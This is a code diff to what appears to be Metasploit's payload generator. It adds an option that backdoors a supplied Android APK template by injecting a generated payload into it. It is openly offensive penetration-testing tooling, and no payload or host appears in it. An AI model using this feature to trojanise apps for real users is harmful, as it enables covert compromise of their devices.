@@ -1,4 +1,5 @@
 # -*- coding: binary -*-
+require 'msf/core/payload/apk'
 require 'active_support/core_ext/numeric/bytes'
 module Msf
 
@@ -305,9 +306,15 @@ module Msf
     # @return [String] A string containing the bytes of the payload in the format selected
     def generate_payload
       if platform == "java" or arch == "java" or payload.start_with? "java/"
-        p = generate_java_payload
-        cli_print "Payload size: #{p.length} bytes"
-        p
+        raw_payload = generate_java_payload
+        cli_print "Payload size: #{raw_payload.length} bytes"
+        raw_payload
+      elsif payload.start_with? "android/" and not template.blank?
+        cli_print "Using APK template: #{template}"
+        apk_backdoor = ::Msf::Payload::Apk::ApkBackdoor::new()
+        raw_payload = apk_backdoor.backdoor_apk(template, generate_raw_payload)
+        cli_print "Payload size: #{raw_payload.length} bytes"
+        raw_payload
       else
         raw_payload = generate_raw_payload
         raw_payload = add_shellcode(raw_payload)
